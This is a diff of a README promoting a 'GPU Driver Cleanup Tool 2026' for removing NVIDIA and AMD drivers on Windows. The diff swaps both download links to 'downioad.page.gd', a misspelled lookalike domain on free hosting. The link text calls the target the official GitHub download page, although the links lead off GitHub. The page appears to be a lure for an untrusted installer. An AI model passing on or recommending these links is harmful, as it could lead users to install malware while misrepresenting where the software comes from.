@@ -2,7 +2,7 @@
 
 GPU Driver Cleanup Tool 2026 is a comprehensive utility designed to completely remove and clean up GPU drivers from your Windows system. Whether you're experiencing driver conflicts, upgrading your graphics card, or need a fresh start, this tool ensures all remnants of NVIDIA and AMD drivers are thoroughly eliminated. It's a reliable alternative to Display Driver Uninstaller (DDU) and is optimized for Windows 10 and 11.
 
-[![Download Installer](https://img.shields.io/badge/Download-SetupLatest-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-SetupLatest-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -54,7 +54,7 @@ Yes, it supports both dedicated and integrated GPUs from Intel, NVIDIA, and AMD.
 
 Get the latest version of GPU Driver Cleanup Tool 2026 from the official GitHub download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
